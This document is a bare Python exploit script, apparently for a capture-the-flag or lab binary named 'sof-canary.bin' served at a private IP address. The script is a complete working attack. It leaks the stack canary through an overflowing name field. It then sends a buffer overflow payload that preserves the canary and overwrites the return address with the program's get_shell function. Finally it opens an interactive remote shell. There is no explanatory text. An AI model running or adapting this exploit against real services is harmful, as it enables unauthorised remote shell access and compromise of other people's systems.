#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'192.168.75.139','port':8080}

binf = ELF('sof-canary.bin')

addr_get_shell      = binf.function('get_shell')

#==========
def attack(cmn):
    cmn.read_until('Input Name >> ')
    cmn.send('a'*0x20+'!')
    cmn.read_until('a!')
    canary = unpack_32('\0'+cmn.read(3))

    info('canary    = 0x%08x' % canary)

    exploit  = 'a'*0x20
    exploit += pack_32(canary)
    exploit += 'a'*(0x30-len(exploit))
    exploit += pack_32(addr_get_shell)
    
    cmn.read_until('Input message >> ')
    cmn.sendln(exploit)

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
